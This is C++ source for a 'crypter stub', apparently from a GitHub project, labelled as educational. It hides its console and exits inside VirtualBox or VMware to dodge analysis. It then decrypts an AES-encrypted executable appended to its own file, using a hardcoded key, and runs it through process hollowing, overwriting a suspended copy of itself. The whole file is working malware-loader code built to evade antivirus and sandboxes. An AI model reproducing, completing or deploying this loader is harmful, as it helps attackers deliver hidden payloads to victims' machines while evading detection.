#include <fstream>
#include "VirtualAES\VirtualAES.h"
#include <Windows.h>
#include <TlHelp32.h>

/*
*	AES Encrypted and AntiVM PE Loader (Crypter Stub)
*	
*	https://www.github.com/Include-sys/hCrypt
*
*	Coded by Include-sys for Educational Purposes
*/

/*		Virtual Machine Detection Functions			*/
bool IsInsideVirtualBox()
{
	HKEY HK = 0;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &HK) == ERROR_SUCCESS)
	{
		return true;
	}
}
bool IsInsideVMWare()
{
	bool rc = true;

	__try
	{
		__asm
		{
			push   edx
			push   ecx
			push   ebx

			mov    eax, 'VMXh'
			mov    ebx, 0
			mov    ecx, 10
			mov    edx, 'VX'

			in     eax, dx

			cmp    ebx, 'VMXh'
			setz[rc]

			pop    ebx
			pop    ecx
			pop    edx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		rc = false;
	}

	return rc;
}
/*		Virtual Machine Detection Functions			*/


/*				PE Execution Function				*/
int RunPortableExecutable(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS* NtHeader;
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	DWORD* ImageBase;
	void* pImageBase;

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);

	GetModuleFileNameA(0, CurrentFilePath, 1024);
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
	{
		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
		{
			LPCONTEXT CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
			{
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
				
				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}

				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
				ResumeThread(PI.hThread);

				
			}
		}
	}
	return 0;
}



/*		  AES-256 Bit Decryption Function			*/	
void AESDecrypt(char* toDecrypt, int size)
{
	//Explanation exist in Builder
	unsigned char key[KEY_256] = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";

	unsigned char ciphertext[BLOCK_SIZE];
	unsigned char decrypted[BLOCK_SIZE];

	aes_ctx_t* ctx;
	virtualAES::initialize();
	ctx = virtualAES::allocatectx(key, sizeof(key));

	int count = 0;
	int index = size / 16;
	int innerCount = 0;
	int innerIndex = 16;
	int dataCount = 0;
	int copyCount = 0;
	for (count; count < index; count++)
	{
		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			ciphertext[innerCount] = toDecrypt[dataCount];
			dataCount++;
		}

		virtualAES::decrypt(ctx, ciphertext, decrypted);

		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			toDecrypt[copyCount] = decrypted[innerCount];
			copyCount++;
		}
	}

	delete ctx;
}


int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);			//Hide Console Window =)

	if (IsInsideVirtualBox())
	{
		return 0;
	}
	if (IsInsideVMWare())
	{
		return 0;
	}

	char* rawData;										//PE holder
	long int stubsize = 26624;							//Stub size

	int size = MAX_PATH;								//Output path length
	char *filename = new char[size];					//Output path name

	GetModuleFileNameA(NULL, filename, stubsize);		

	std::ifstream file(filename, std::ios::binary);		//Open Output(itself)
	
	if (!file.is_open())
	{
		return -1;
	}
	
	file.seekg(0, file.end);							//Go eof
	long outputsize = static_cast<long>(file.tellg());	//Get Size
	
	long realsize = outputsize - stubsize;				//Get the size of added PE
	rawData = new char[realsize];						//Allocate memory for added PE
	
	file.seekg(stubsize);								//Go the end of stub
	file.read(rawData, realsize);						//Copy added PE data into @rawData
	file.close();										//Close file

	AESDecrypt(rawData, realsize);						//Decrypt encrypted PE

	RunPortableExecutable(rawData);						//Run Decrypted PE

	delete[] rawData;									//Delete allocated memory for PE

	return 0;

}